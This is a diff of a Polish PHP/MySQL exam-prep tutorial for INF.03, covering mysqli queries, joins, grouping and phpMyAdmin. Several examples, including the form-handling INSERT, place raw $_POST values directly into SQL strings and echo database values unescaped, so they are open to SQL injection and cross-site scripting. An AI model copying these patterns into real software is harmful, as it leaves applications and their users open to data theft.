+### **Praktyczny przykład - prosty dziennik (log)**
+
+```php
+<?php
+    function zapiszLog($wiadomosc) {
+        $plik = "dziennik.log";
+        $czas = date("Y-m-d H:i:s");
+        $wpis = "[$czas] $wiadomosc\n";
+        
+        file_put_contents($plik, $wpis, FILE_APPEND);
+    }
+    
+    // Użycie
+    zapiszLog("Użytkownik zalogował się");
+    zapiszLog("Użytkownik zmienił hasło");
+    zapiszLog("Użytkownik wylogował się");
+    
+    // Odczyt logu
+    if (file_exists("dziennik.log")) {
+        echo "<pre>";
+        echo htmlspecialchars(file_get_contents("dziennik.log"));
+        echo "</pre>";
+    }
+?>
+```
+
+---
+
+## **11. Bazy danych MySQL - STYL PROCEDURALNY (EGZAMIN INF.03)**
+
+### **Czym jest baza danych?**
+
+Baza danych to uporządkowany zbiór danych. MySQL to system zarządzania relacyjnymi bazami danych.
+
+**Podstawowe pojęcia:**
+- **Baza danych** - kolekcja tabel
+- **Tabela** - zbiór rekordów (wierszy)
+- **Rekord** - pojedynczy wiersz danych
+- **Kolumna** - pole w tabeli (np. imię, email, wiek)
+
+### **Połączenie z bazą danych - mysqli_connect()**
+
+**To jest DOKŁADNIE tak jak na egzaminie INF.03!**
+
+```php
+<?php
+    // Parametry połączenia
+    $host = "localhost";        // Adres serwera MySQL
+    $uzytkownik = "root";       // Nazwa użytkownika
+    $haslo = "";                // Hasło (domyślnie puste w XAMPP)
+    $nazwaBazy = "mojabaza";    // Nazwa bazy danych
+    
+    // Połączenie z bazą
+    $conn = mysqli_connect($host, $uzytkownik, $haslo, $nazwaBazy);
+    
+    // Sprawdzenie połączenia
+    if (!$conn) {
+        die("Błąd połączenia: " . mysqli_connect_error());
+    }
+    
+    echo "Połączono pomyślnie!";
+    
+    // Ustawienie kodowania UTF-8 (WAŻNE dla polskich znaków!)
+    mysqli_set_charset($conn, "utf8");
+    
+    // Na końcu skryptu ZAWSZE zamykaj połączenie!
+    mysqli_close($conn);
+?>
+```
+
+**WAŻNE dla egzaminu:**
+- ✅ Zawsze używaj `mysqli_connect()` (nie `mysql_connect()` - to stara funkcja!)
+- ✅ Sprawdzaj połączenie: `if (!$conn)`
+- ✅ ZAWSZE zamykaj: `mysqli_close($conn)` - to OBOWIĄZKOWE na egzaminie!
+- ✅ Ustawiaj UTF-8: `mysqli_set_charset($conn, "utf8")` dla polskich znaków
+
+### **SELECT - pobieranie danych (najważniejsze na egzaminie!)**
+
+#### **Podstawowy SELECT - wyświetlanie wszystkich rekordów**
+
+```php
+<?php
+    // 1. Połączenie
+    $conn = mysqli_connect("localhost", "root", "", "mojabaza");
+    
+    // 2. Zapytanie SQL
+    $sql = "SELECT * FROM uzytkownicy";
+    
+    // 3. Wykonanie zapytania
+    $wynik = mysqli_query($conn, $sql);
+    
+    // 4. Sprawdzenie czy są wyniki
+    if (mysqli_num_rows($wynik) > 0) {
+        
+        // 5. Wyświetlanie w tabeli HTML
+        echo "<table border='1'>";
+        echo "<tr><th>ID</th><th>Imię</th><th>Email</th><th>Wiek</th></tr>";
+        
+        // 6. Pętla WHILE - pobieranie każdego wiersza
+        while ($wiersz = mysqli_fetch_array($wynik)) {
+            echo "<tr>";
+            echo "<td>" . $wiersz["id"] . "</td>";
+            echo "<td>" . $wiersz["imie"] . "</td>";
+            echo "<td>" . $wiersz["email"] . "</td>";
+            echo "<td>" . $wiersz["wiek"] . "</td>";
+            echo "</tr>";
+        }
+        
+        echo "</table>";
+        
+    } else {
+        echo "Brak wyników";
+    }
+    
+    // 7. ZAMKNIJ POŁĄCZENIE (OBOWIĄZKOWO!)
+    mysqli_close($conn);
+?>
+```
+
+**Krok po kroku - jak to działa:**
+
+1. `mysqli_connect()` - łączy z bazą
+2. Tworzymy zapytanie SQL w zmiennej `$sql`
+3. `mysqli_query()` - wykonuje zapytanie, zwraca wynik
+4. `mysqli_num_rows()` - sprawdza ile wierszy zwrócono
+5. `mysqli_fetch_array()` - pobiera jeden wiersz jako tablicę
+6. Pętla `while` - przechodzi przez wszystkie wiersze
+7. `mysqli_close()` - zamyka połączenie
+
+#### **SELECT z warunkiem WHERE**
+
+```php
+<?php
+    $conn = mysqli_connect("localhost", "root", "", "mojabaza");
+    
+    // Pobierz tylko użytkowników starszych niż 18 lat
+    $sql = "SELECT * FROM uzytkownicy WHERE wiek > 18";
+    $wynik = mysqli_query($conn, $sql);
+    
+    while ($wiersz = mysqli_fetch_array($wynik)) {
+        echo $wiersz["imie"] . " ma " . $wiersz["wiek"] . " lat<br>";
+    }
+    
+    mysqli_close($conn);
+?>
+```
+
+#### **SELECT z LIKE (wyszukiwanie)**
+
+```php
+<?php
+    $conn = mysqli_connect("localhost", "root", "", "mojabaza");
+    
+    // Znajdź wszystkich użytkowników których imię zaczyna się na "A"
+    $sql = "SELECT * FROM uzytkownicy WHERE imie LIKE 'A%'";
+    $wynik = mysqli_query($conn, $sql);
+    
+    while ($wiersz = mysqli_fetch_array($wynik)) {
+        echo $wiersz["imie"] . "<br>";
+    }
+    
+    mysqli_close($conn);
+?>
+```
+
+**Wzorce w LIKE:**
+- `'A%'` - zaczyna się na A (Anna, Adam, Agata)
+- `'%a'` - kończy się na a (Anna, Maria, Ola)
+- `'%an%'` - zawiera "an" (Anna, Jan, Joanna)
+
+#### **SELECT z ORDER BY (sortowanie)**
+
+```php
+<?php
+    $conn = mysqli_connect("localhost", "root", "", "mojabaza");
+    
+    // Sortowanie alfabetyczne po imieniu
+    $sql = "SELECT * FROM uzytkownicy ORDER BY imie ASC";
+    $wynik = mysqli_query($conn, $sql);
+    
+    while ($wiersz = mysqli_fetch_array($wynik)) {
+        echo $wiersz["imie"] . "<br>";
+    }
+    
+    mysqli_close($conn);
+?>
+```
+
+- `ASC` - rosnąco (A-Z, 0-9)
+- `DESC` - malejąco (Z-A, 9-0)
+
+#### **SELECT z LIMIT (ograniczenie wyników)**
+
+```php
+<?php
+    $conn = mysqli_connect("localhost", "root", "", "mojabaza");
+    
+    // Pobierz tylko 5 pierwszych użytkowników
+    $sql = "SELECT * FROM uzytkownicy LIMIT 5";
+    $wynik = mysqli_query($conn, $sql);
+    
+    while ($wiersz = mysqli_fetch_array($wynik)) {
+        echo $wiersz["imie"] . "<br>";
+    }
+    
+    mysqli_close($conn);
+?>
+```
+
+### **INSERT - dodawanie danych**
+
+```php
+<?php
+    $conn = mysqli_connect("localhost", "root", "", "mojabaza");
+    
+    // Dane do wstawienia
+    $imie = "Jan";
+    $email = "jan@example.com";
+    $wiek = 25;
+    
+    // Zapytanie INSERT
+    $sql = "INSERT INTO uzytkownicy (imie, email, wiek) 
+            VALUES ('$imie', '$email', $wiek)";
+    
+    // Wykonanie zapytania
+    if (mysqli_query($conn, $sql)) {
+        echo "Dodano użytkownika pomyślnie!";
+        
+        // Pobranie ID ostatnio dodanego rekordu
+        $ostatnieID = mysqli_insert_id($conn);
+        echo " Nowe ID: $ostatnieID";
+    } else {
+        echo "Błąd: " . mysqli_error($conn);
+    }
+    
+    mysqli_close($conn);
+?>
+```
+
+#### **INSERT z danymi z formularza**
+
+```php
+<?php
+    // Odbieranie danych z formularza
+    if ($_SERVER["REQUEST_METHOD"] == "POST") {
+        
+        $conn = mysqli_connect("localhost", "root", "", "mojabaza");
+        
+        // Pobierz dane z formularza
+        $imie = $_POST["imie"];
+        $email = $_POST["email"];
+        $wiek = $_POST["wiek"];
+        
+        // Zapytanie INSERT
+        $sql = "INSERT INTO uzytkownicy (imie, email, wiek) 
+                VALUES ('$imie', '$email', $wiek)";
+        
+        if (mysqli_query($conn, $sql)) {
+            echo "Dane zapisane!";
+        } else {
+            echo "Błąd: " . mysqli_error($conn);
+        }
+        
+        mysqli_close($conn);
+    }
+?>
+
+<!-- Formularz HTML -->
+<form method="POST">
+    <input type="text" name="imie" placeholder="Imię" required><br>
+    <input type="email" name="email" placeholder="Email" required><br>
+    <input type="number" name="wiek" placeholder="Wiek" required><br>
+    <button type="submit">Dodaj</button>
 </form>
 ```
 
-### Przetwarzanie przesłanych plików w PHP
+### **UPDATE - aktualizacja danych**
 
 ```php
 <?php
-// upload.php
-if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_FILES["plik"])) {
-    // Informacje o przesłanym pliku
-    $file_name = $_FILES["plik"]["name"];      // Oryginalna nazwa
-    $file_tmp  = $_FILES["plik"]["tmp_name"];  // Tymczasowa lokalizacja
-    $file_size = $_FILES["plik"]["size"];      // Rozmiar w bajtach
-    $file_type = $_FILES["plik"]["type"];      // Typ MIME
-    $file_ext  = strtolower(pathinfo($file_name, PATHINFO_EXTENSION)); // Rozszerzenie
-
-    // 1. Walidacja - rozszerzenie
-    $allowed_extensions = ["jpg", "jpeg", "png", "gif", "pdf", "doc", "docx"];
-
-    if (!in_array($file_ext, $allowed_extensions)) {
-        die("❌ Niedozwolony typ pliku! Dozwolone: " . implode(", ", $allowed_extensions));
-    }
-
-    // 2. Walidacja - rozmiar (maks 5MB)
-    $max_size = 5 * 1024 * 1024; // 5MB w bajtach
-
-    if ($file_size > $max_size) {
-        die("❌ Plik jest za duży! Maksymalny rozmiar to 5MB.");
-    }
-
-    // 3. Generowanie bezpiecznej nazwy pliku
-    $new_file_name = time() . "_" . md5($file_name) . "." . $file_ext;
-    $upload_dir = "uploads/";
-    $target_path = $upload_dir . $new_file_name;
-
-    // 4. Sprawdzanie czy folder uploads istnieje
-    if (!is_dir($upload_dir)) {
-        mkdir($upload_dir, 0755, true); // Tworzenie folderu jeśli nie istnieje
-    }
-
-    // 5. Przeniesienie pliku do docelowego folderu
-    if (move_uploaded_file($file_tmp, $target_path)) {
-        echo "✅ Plik został przesłany pomyślnie!<br>";
-        echo "📂 Zapisano jako: $new_file_name<br>";
-
-        // Opcjonalnie: zapis informacji o pliku do bazy danych
-        $opis = isset($_POST['opis']) ? htmlspecialchars($_POST['opis']) : "";
-        echo "📝 Opis: $opis";
+    $conn = mysqli_connect("localhost", "root", "", "mojabaza");
+    
+    // Zaktualizuj wiek użytkownika o ID = 1
+    $nowyWiek = 26;
+    $userId = 1;
+    
+    $sql = "UPDATE uzytkownicy SET wiek = $nowyWiek WHERE id = $userId";
+    
+    if (mysqli_query($conn, $sql)) {
+        $ilosc = mysqli_affected_rows($conn);
+        echo "Zaktualizowano $ilosc rekord(ów)";
     } else {
-        echo "❌ Wystąpił błąd podczas przesyłania pliku.";
+        echo "Błąd: " . mysqli_error($conn);
+    }
+    
+    mysqli_close($conn);
+?>
+```
+
+**mysqli_affected_rows()** - zwraca liczbę zmienionych wierszy (WAŻNE na egzaminie!)
+
+### **DELETE - usuwanie danych**
+
+```php
+<?php
+    $conn = mysqli_connect("localhost", "root", "", "mojabaza");
+    
+    // Usuń użytkownika o ID = 1
+    $userId = 1;
+    
+    $sql = "DELETE FROM uzytkownicy WHERE id = $userId";
+    
+    if (mysqli_query($conn, $sql)) {
+        $ilosc = mysqli_affected_rows($conn);
+        echo "Usunięto $ilosc rekord(ów)";
+    } else {
+        echo "Błąd: " . mysqli_error($conn);
+    }
+    
+    mysqli_close($conn);
+?>
+```
+
+### **Funkcje agregujące SQL (często na egzaminie!)**
+
+#### **COUNT - liczenie rekordów**
+
+```php
+<?php
+    $conn = mysqli_connect("localhost", "root", "", "mojabaza");
+    
+    // Policz wszystkich użytkowników
+    $sql = "SELECT COUNT(*) as ilosc FROM uzytkownicy";
+    $wynik = mysqli_query($conn, $sql);
+    $wiersz = mysqli_fetch_array($wynik);
+    
+    echo "Liczba użytkowników: " . $wiersz["ilosc"];
+    
+    mysqli_close($conn);
+?>
+```
+
+#### **AVG - średnia**
+
+```php
+<?php
+    $conn = mysqli_connect("localhost", "root", "", "mojabaza");
+    
+    // Średni wiek użytkowników
+    $sql = "SELECT AVG(wiek) as sredni_wiek FROM uzytkownicy";
+    $wynik = mysqli_query($conn, $sql);
+    $wiersz = mysqli_fetch_array($wynik);
+    
+    echo "Średni wiek: " . round($wiersz["sredni_wiek"], 2);
+    
+    mysqli_close($conn);
+?>
+```
+
+#### **SUM - suma**
+
+```php
+<?php
+    $conn = mysqli_connect("localhost", "root", "", "mojabaza");
+    
+    // Suma wszystkich cen w tabeli produkty
+    $sql = "SELECT SUM(cena) as suma FROM produkty";
+    $wynik = mysqli_query($conn, $sql);
+    $wiersz = mysqli_fetch_array($wynik);
+    
+    echo "Suma cen: " . $wiersz["suma"] . " zł";
+    
+    mysqli_close($conn);
+?>
+```
+
+#### **MIN i MAX**
+
+```php
+<?php
+    $conn = mysqli_connect("localhost", "root", "", "mojabaza");
+    
+    // Najmłodszy i najstarszy użytkownik
+    $sql = "SELECT MIN(wiek) as min_wiek, MAX(wiek) as max_wiek FROM uzytkownicy";
+    $wynik = mysqli_query($conn, $sql);
+    $wiersz = mysqli_fetch_array($wynik);
+    
+    echo "Najmłodszy: " . $wiersz["min_wiek"] . " lat<br>";
+    echo "Najstarszy: " . $wiersz["max_wiek"] . " lat";
+    
+    mysqli_close($conn);
+?>
+```
+
+### **JOIN - łączenie tabel (BARDZO WAŻNE na egzaminie!)**
+
+#### **INNER JOIN - podstawowe łączenie**
+
+Przykład: Mamy dwie tabele:
+- `uzytkownicy` (id, imie)
+- `zamowienia` (id, uzytkownik_id, produkt, cena)
+
+```php
+<?php
+    $conn = mysqli_connect("localhost", "root", "", "sklep");
+    
+    // Pokaż wszystkie zamówienia wraz z imionami użytkowników
+    $sql = "SELECT uzytkownicy.imie, zamowienia.produkt, zamowienia.cena 
+            FROM zamowienia 
+            INNER JOIN uzytkownicy ON zamowienia.uzytkownik_id = uzytkownicy.id";
+    
+    $wynik = mysqli_query($conn, $sql);
+    
+    echo "<table border='1'>";
+    echo "<tr><th>Imię</th><th>Produkt</th><th>Cena</th></tr>";
+    
+    while ($wiersz = mysqli_fetch_array($wynik)) {
+        echo "<tr>";
+        echo "<td>" . $wiersz["imie"] . "</td>";
+        echo "<td>" . $wiersz["produkt"] . "</td>";
+        echo "<td>" . $wiersz["cena"] . " zł</td>";
+        echo "</tr>";
+    }
+    
+    echo "</table>";
+    
+    mysqli_close($conn);
+?>
+```
+
+#### **LEFT JOIN - wszystkie z lewej tabeli**
+
+```php
+<?php
+    $conn = mysqli_connect("localhost", "root", "", "sklep");
+    
+    // Pokaż wszystkich użytkowników i ich zamówienia (jeśli mają)
+    $sql = "SELECT uzytkownicy.imie, zamowienia.produkt 
+            FROM uzytkownicy 
+            LEFT JOIN zamowienia ON uzytkownicy.id = zamowienia.uzytkownik_id";
+    
+    $wynik = mysqli_query($conn, $sql);
+    
+    while ($wiersz = mysqli_fetch_array($wynik)) {
+        echo $wiersz["imie"];
+        if ($wiersz["produkt"]) {
+            echo " - zamówił: " . $wiersz["produkt"];
+        } else {
+            echo " - brak zamówień";
+        }
+        echo "<br>";
+    }
+    
+    mysqli_close($conn);
+?>
+```
+
+### **Funkcje daty i czasu w SQL (na egzaminie!)**
+
+```php
+<?php
+    $conn = mysqli_connect("localhost", "root", "", "mojabaza");
+    
+    // Aktualna data
+    $sql = "SELECT CURRENT_DATE() as dzisiaj";
+    $wynik = mysqli_query($conn, $sql);
+    $wiersz = mysqli_fetch_array($wynik);
+    echo "Dzisiaj: " . $wiersz["dzisiaj"] . "<br>";
+    
+    // Aktualny czas
+    $sql = "SELECT CURRENT_TIME() as teraz";
+    $wynik = mysqli_query($conn, $sql);
+    $wiersz = mysqli_fetch_array($wynik);
+    echo "Teraz: " . $wiersz["teraz"] . "<br>";
+    
+    // Aktualna data i czas
+    $sql = "SELECT NOW() as teraz";
+    $wynik = mysqli_query($conn, $sql);
+    $wiersz = mysqli_fetch_array($wynik);
+    echo "Teraz: " . $wiersz["teraz"];
+    
+    mysqli_close($conn);
+?>
+```
+
+### **GROUP BY - grupowanie wyników (BARDZO WAŻNE NA EGZAMINIE!)**
+
+GROUP BY pozwala grupować wiersze i używać funkcji agregujących. **To jest BARDZO CZĘSTO na egzaminie INF.03!**
+
+#### **Podstawowe GROUP BY**
+
+```php
+<?php
+    $conn = mysqli_connect("localhost", "root", "", "sklep");
+    mysqli_set_charset($conn, "utf8");
+    
+    // Policz ile produktów w każdej kategorii
+    $sql = "SELECT kategoria, COUNT(*) as ilosc 
+            FROM produkty 
+            GROUP BY kategoria";
+    
+    $wynik = mysqli_query($conn, $sql);
+    
+    echo "<h3>Produkty w kategoriach:</h3>";
+    while ($wiersz = mysqli_fetch_array($wynik)) {
+        echo $wiersz["kategoria"] . ": " . $wiersz["ilosc"] . " produktów<br>";
+    }
+    
+    mysqli_close($conn);
+?>
+```
+
+**Wynik przykładowy:**
+```
+Elektronika: 15 produktów
+Książki: 23 produkty
+Ubrania: 45 produktów
+```
+
+#### **GROUP BY z SUM - suma dla grup**
+
+```php
+<?php
+    $conn = mysqli_connect("localhost", "root", "", "sklep");
+    
+    // Suma sprzedaży dla każdego produktu
+    $sql = "SELECT produkt, SUM(ilosc) as suma_sprzedanych 
+            FROM zamowienia 
+            GROUP BY produkt 
+            ORDER BY suma_sprzedanych DESC";
+    
+    $wynik = mysqli_query($conn, $sql);
+    
+    echo "<h3>Bestsellery:</h3>";
+    echo "<ol>";
+    while ($wiersz = mysqli_fetch_array($wynik)) {
+        echo "<li>" . $wiersz["produkt"] . " - sprzedano: " . $wiersz["suma_sprzedanych"] . " szt.</li>";
+    }
+    echo "</ol>";
+    
+    mysqli_close($conn);
+?>
+```
+
+#### **GROUP BY z AVG - średnia dla grup**
+
+```php
+<?php
+    $conn = mysqli_connect("localhost", "root", "", "sklep");
+    
+    // Średnia cena w każdej kategorii
+    $sql = "SELECT kategoria, AVG(cena) as srednia_cena, COUNT(*) as ilosc 
+            FROM produkty 
+            GROUP BY kategoria";
+    
+    $wynik = mysqli_query($conn, $sql);
+    
+    echo "<table border='1'>";
+    echo "<tr><th>Kategoria</th><th>Średnia cena</th><th>Liczba produktów</th></tr>";
+    
+    while ($wiersz = mysqli_fetch_array($wynik)) {
+        echo "<tr>";
+        echo "<td>" . $wiersz["kategoria"] . "</td>";
+        echo "<td>" . round($wiersz["srednia_cena"], 2) . " zł</td>";
+        echo "<td>" . $wiersz["ilosc"] . "</td>";
+        echo "</tr>";
+    }
+    
+    echo "</table>";
+    
+    mysqli_close($conn);
+?>
+```
+
+#### **GROUP BY z wieloma kolumnami**
+
+```php
+<?php
+    $conn = mysqli_connect("localhost", "root", "", "sklep");
+    
+    // Sprzedaż według miesiąca i produktu
+    $sql = "SELECT MONTH(data_zamowienia) as miesiac, produkt, SUM(ilosc) as suma 
+            FROM zamowienia 
+            GROUP BY MONTH(data_zamowienia), produkt 
+            ORDER BY miesiac, suma DESC";
+    
+    $wynik = mysqli_query($conn, $sql);
+    
+    $aktualnyMiesiac = 0;
+    
+    while ($wiersz = mysqli_fetch_array($wynik)) {
+        if ($aktualnyMiesiac != $wiersz["miesiac"]) {
+            $aktualnyMiesiac = $wiersz["miesiac"];
+            echo "<h4>Miesiąc: $aktualnyMiesiac</h4>";
+        }
+        echo $wiersz["produkt"] . " - " . $wiersz["suma"] . " szt.<br>";
+    }
+    
+    mysqli_close($conn);
+?>
+```
+
+### **HAVING - filtrowanie po agregacji (EGZAMIN!)**
+
+HAVING działa jak WHERE, ale dla wyników GROUP BY:
+
+```php
+<?php
+    $conn = mysqli_connect("localhost", "root", "", "sklep");
+    
+    // Pokaż tylko kategorie z więcej niż 10 produktami
+    $sql = "SELECT kategoria, COUNT(*) as ilosc 
+            FROM produkty 
+            GROUP BY kategoria 
+            HAVING ilosc > 10";
+    
+    $wynik = mysqli_query($conn, $sql);
+    
+    echo "<h3>Popularne kategorie (>10 produktów):</h3>";
+    while ($wiersz = mysqli_fetch_array($wynik)) {
+        echo $wiersz["kategoria"] . ": " . $wiersz["ilosc"] . " produktów<br>";
+    }
+    
+    mysqli_close($conn);
+?>
+```
+
+**Różnica WHERE vs HAVING:**
+
+```php
+<?php
+    // WHERE - filtruje PRZED grupowaniem
+    $sql = "SELECT kategoria, COUNT(*) as ilosc 
+            FROM produkty 
+            WHERE cena > 100
+            GROUP BY kategoria";
+    // Najpierw bierze produkty droższe niż 100zł, potem grupuje
+    
+    // HAVING - filtruje PO grupowaniu
+    $sql = "SELECT kategoria, COUNT(*) as ilosc 
+            FROM produkty 
+            GROUP BY kategoria 
+            HAVING ilosc > 5";
+    // Najpierw grupuje, potem pokazuje tylko grupy z >5 produktami
+?>
+```
+
+### **ALTER TABLE - modyfikacja struktury tabeli (EGZAMIN!)**
+
+Na egzaminie często trzeba modyfikować strukturę istniejącej tabeli!
+
+#### **Dodawanie kolumny**
+
+```php
+<?php
+    $conn = mysqli_connect("localhost", "root", "", "sklep");
+    
+    // Dodaj kolumnę "opis" do tabeli produkty
+    $sql = "ALTER TABLE produkty ADD opis TEXT";
+    
+    if (mysqli_query($conn, $sql)) {
+        echo "Kolumna 'opis' dodana pomyślnie";
+    } else {
+        echo "Błąd: " . mysqli_error($conn);
+    }
+    
+    mysqli_close($conn);
+?>
+```
+
+#### **Usuwanie kolumny**
+
+```php
+<?php
+    $conn = mysqli_connect("localhost", "root", "", "sklep");
+    
+    // Usuń kolumnę "stary_kod" z tabeli produkty
+    $sql = "ALTER TABLE produkty DROP COLUMN stary_kod";
+    
+    if (mysqli_query($conn, $sql)) {
+        echo "Kolumna usunięta";
+    }
+    
+    mysqli_close($conn);
+?>
+```
+
+#### **Zmiana typu kolumny**
+
+```php
+<?php
+    $conn = mysqli_connect("localhost", "root", "", "sklep");
+    
+    // Zmień typ kolumny "kod_pocztowy" z INT na VARCHAR(6)
+    $sql = "ALTER TABLE adresy MODIFY kod_pocztowy VARCHAR(6)";
+    
+    if (mysqli_query($conn, $sql)) {
+        echo "Typ kolumny zmieniony";
+    }
+    
+    mysqli_close($conn);
+?>
+```
+
+#### **Zmiana nazwy kolumny**
+
+```php
+<?php
+    $conn = mysqli_connect("localhost", "root", "", "sklep");
+    
+    // Zmień nazwę kolumny z "imie_nazwisko" na "pelne_imie"
+    $sql = "ALTER TABLE uzytkownicy CHANGE imie_nazwisko pelne_imie VARCHAR(100)";
+    
+    if (mysqli_query($conn, $sql)) {
+        echo "Nazwa kolumny zmieniona";
+    }
+    
+    mysqli_close($conn);
+?>
+```
+
+### **phpMyAdmin - BARDZO WAŻNE NA EGZAMINIE!**
+
+Na egzaminie często musisz wykonać zapytania w phpMyAdmin i zapisać wyniki!
+
+#### **Jak pracować w phpMyAdmin:**
+
+1. **Otwórz phpMyAdmin:**
+   - Adres: `localhost/phpmyadmin`
+   - Zaloguj się (domyślnie użytkownik: `root`, hasło: puste)
+
+2. **Wybierz bazę danych:**
+   - Kliknij nazwę bazy w lewym menu
+
+3. **Wykonaj zapytanie SQL:**
+   - Zakładka **"SQL"** u góry
+   - Wpisz zapytanie
+   - Kliknij **"Wykonaj"** (Go)
+
+4. **Zapisz wynik do pliku (OBOWIĄZKOWO NA EGZAMINIE!):**
+   - Po wykonaniu zapytania **zrób zrzut ekranu** (Print Screen)
+   - Zapisz jako PNG lub JPG
+   - Nazwa pliku: `kwerenda1.png`, `kwerenda2.png` itd.
+
+#### **Zapisywanie kwerend do pliku kwerendy.txt (EGZAMIN!)**
+
+Na egzaminie MUSISZ zapisać wszystkie zapytania SQL do pliku `kwerendy.txt`!
+
+**Przykład zawartości pliku kwerendy.txt:**
+
+```
+# Zadanie 4.1 - Wybierz wszystkie produkty droższe niż 100 zł
+SELECT * FROM produkty WHERE cena > 100;
+
+# Zadanie 4.2 - Dodaj nową kategorię "Sport"
+INSERT INTO kategorie (nazwa) VALUES ('Sport');
+
+# Zadanie 4.3 - Zaktualizuj cenę produktu o ID=5
+UPDATE produkty SET cena = 149.99 WHERE id = 5;
+
+# Zadanie 4.4 - Usuń produkty ze stanem magazynowym = 0
+DELETE FROM produkty WHERE stan = 0;
+```
+
+**Jak to zrobić w PHP (automatycznie):**
+
+```php
+<?php
+    // Funkcja zapisująca kwerendę do pliku
+    function zapiszKwerende($numer, $opis, $sql) {
+        $plik = "kwerendy.txt";
+        $tekst = "# Zadanie $numer - $opis\n";
+        $tekst .= "$sql\n\n";
+        file_put_contents($plik, $tekst, FILE_APPEND);
+    }
+    
+    // Przykład użycia
+    $conn = mysqli_connect("localhost", "root", "", "sklep");
+    
+    $sql = "SELECT * FROM produkty WHERE cena > 100";
+    zapiszKwerende("4.1", "Produkty droższe niż 100 zł", $sql);
+    
+    $wynik = mysqli_query($conn, $sql);
+    // ... wyświetlanie wyników ...
+    
+    mysqli_close($conn);
+?>
+```
+
+### **Tabela funkcji mysqli - DO ZAPAMIĘTANIA NA EGZAMIN!**
+
+| Funkcja | Co robi | Przykład |
+|---------|---------|----------|
+| `mysqli_connect()` | Łączy z bazą | `mysqli_connect("localhost", "root", "", "baza")` |
+| `mysqli_select_db()` | Wybiera bazę danych | `mysqli_select_db($conn, "nazwa_bazy")` |
+| `mysqli_query()` | Wykonuje zapytanie SQL | `mysqli_query($conn, $sql)` |
+| `mysqli_fetch_array()` | Pobiera wiersz jako tablicę | `mysqli_fetch_array($wynik)` |
+| `mysqli_fetch_row()` | Pobiera wiersz jako tablicę numeryczną | `mysqli_fetch_row($wynik)` |
+| `mysqli_num_rows()` | Zwraca liczbę wierszy | `mysqli_num_rows($wynik)` |
+| `mysqli_num_fields()` | Zwraca liczbę kolumn | `mysqli_num_fields($wynik)` |
+| `mysqli_affected_rows()` | Liczba zmienionych wierszy | `mysqli_affected_rows($conn)` |
+| `mysqli_insert_id()` | ID ostatnio dodanego rekordu | `mysqli_insert_id($conn)` |
+| `mysqli_close()` | Zamyka połączenie | `mysqli_close($conn)` |
+| `mysqli_error()` | Zwraca tekst błędu | `mysqli_error($conn)` |
+| `mysqli_set_charset()` | Ustawia kodowanie | `mysqli_set_charset($conn, "utf8")` |
+| `mysqli_real_escape_string()` | Zabezpiecza przed SQL Injection | `mysqli_real_escape_string($conn, $tekst)` |
+
+**⚠️ UWAGA:** Zgodnie z oficjalną dokumentacją CKE dla egzaminu INF.03, powyższe funkcje są PODSTAWĄ! Musisz je znać na pamięć!
+
+### **Przykłady użycia funkcji mysqli (z oficjalnego informatora CKE)**
+
+#### **mysqli_select_db() - zmiana bazy danych**
+
+```php
+<?php
+    // Połączenie BEZ wyboru bazy
+    $conn = mysqli_connect("localhost", "root", "");
+    
+    if (!$conn) {
+        die("Błąd połączenia: " . mysqli_connect_error());
+    }
+    
+    // Wybór bazy danych
+    if (mysqli_select_db($conn, "sklep")) {
+        echo "Wybrano bazę 'sklep'<br>";
+    } else {
+        die("Błąd wyboru bazy: " . mysqli_error($conn));
+    }
+    
+    // Teraz możemy wykonywać zapytania
+    $sql = "SELECT * FROM produkty";
+    $wynik = mysqli_query($conn, $sql);
+    
+    mysqli_close($conn);
+?>
+```
+
+**Kiedy używać?**
+- Gdy łączysz się bez podania nazwy bazy w `mysqli_connect()`
+- Gdy chcesz przełączyć się na inną bazę danych w trakcie działania skryptu
+
+#### **mysqli_fetch_row() - pobieranie jako tablica numeryczna**
+
+```php
+<?php
+    $conn = mysqli_connect("localhost", "root", "", "sklep");
+    mysqli_set_charset($conn, "utf8");
+    
+    $sql = "SELECT nazwa, cena, ilosc FROM produkty WHERE cena < 50";
+    $wynik = mysqli_query($conn, $sql);
+    
+    echo "<h3>Tanie produkty:</h3>";
+    
+    // mysqli_fetch_row() - zwraca tablicę numeryczną [0], [1], [2]...
+    while ($wiersz = mysqli_fetch_row($wynik)) {
+        echo "Produkt: " . $wiersz[0] . " | ";  // nazwa (pierwsza kolumna)
+        echo "Cena: " . $wiersz[1] . " zł | ";  // cena (druga kolumna)
+        echo "Ilość: " . $wiersz[2] . " szt<br>"; // ilosc (trzecia kolumna)
+    }
+    
+    mysqli_close($conn);
+?>
+```
+
+**Różnica między mysqli_fetch_array() a mysqli_fetch_row():**
+
+| Funkcja | Dostęp do danych | Przykład |
+|---------|------------------|----------|
+| `mysqli_fetch_array()` | Po nazwie kolumny LUB indeksie | `$wiersz["nazwa"]` lub `$wiersz[0]` |
+| `mysqli_fetch_row()` | TYLKO po indeksie | `$wiersz[0]`, `$wiersz[1]`, ... |
+
+**Na egzaminie:** Używaj `mysqli_fetch_array()` - jest bardziej czytelna i bezpieczniejsza!
+
+#### **mysqli_num_fields() - liczba kolumn w wyniku**
+
+```php
+<?php
+    $conn = mysqli_connect("localhost", "root", "", "sklep");
+    mysqli_set_charset($conn, "utf8");
+    
+    $sql = "SELECT id, nazwa, cena, kategoria FROM produkty";
+    $wynik = mysqli_query($conn, $sql);
+    
+    // Sprawdzenie liczby kolumn
+    $liczba_kolumn = mysqli_num_fields($wynik);
+    echo "Zapytanie zwraca $liczba_kolumn kolumn<br><br>";
+    // Wyświetli: "Zapytanie zwraca 4 kolumn"
+    
+    // Sprawdzenie liczby wierszy
+    $liczba_wierszy = mysqli_num_rows($wynik);
+    echo "Znaleziono $liczba_wierszy produktów<br><br>";
+    
+    // Wyświetlanie danych
+    while ($wiersz = mysqli_fetch_array($wynik)) {
+        echo $wiersz["nazwa"] . " - " . $wiersz["cena"] . " zł<br>";
+    }
+    
+    mysqli_close($conn);
+?>
+```
+
+**Kiedy używać mysqli_num_fields()?**
+- Gdy chcesz sprawdzić ile kolumn zwróciło zapytanie
+- Przydatne przy dynamicznym generowaniu tabel HTML
+- Rzadko spotykane na egzaminie INF.03, ale jest w oficjalnej dokumentacji CKE
+
+**Przykład - dynamiczne tworzenie tabeli HTML:**
+
+```php
+<?php
+    $conn = mysqli_connect("localhost", "root", "", "sklep");
+    mysqli_set_charset($conn, "utf8");
+    
+    $sql = "SELECT * FROM produkty LIMIT 10";
+    $wynik = mysqli_query($conn, $sql);
+    
+    echo "<table border='1'>";
+    echo "<tr>";
+    
+    // Automatyczne tworzenie nagłówków tabeli
